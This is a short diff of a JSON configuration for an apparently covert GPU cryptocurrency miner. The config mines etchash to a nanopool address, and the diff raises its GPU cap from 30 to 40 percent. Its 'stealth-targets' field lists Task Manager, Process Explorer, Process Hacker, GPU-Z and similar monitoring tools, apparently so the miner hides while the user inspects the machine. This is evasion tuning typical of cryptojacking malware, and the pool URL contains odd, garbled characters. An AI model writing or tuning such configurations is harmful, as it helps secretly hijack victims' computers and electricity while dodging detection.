@@ -1,7 +1,7 @@
 {
     "url": "stratums://`0xee52399c3f2b7d71ab95262e9af6680ac5ededc1`.10g-30:zifx%%myzri7-ceF(*gyt@etc-eu1.nanopool.org:19433",
     "algo": "etchash",
-    "max-gpu": 30,
+    "max-gpu": 40,
     "idle-wait": 33,
     "idle-gpu": 50,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,cpuz.exe,anvir.exe,anvir64.exe,anvirlauncher.exe,gpu-z.exe,real-temp.exe,NVCleanstall.exe,ThrottleStop.exe",
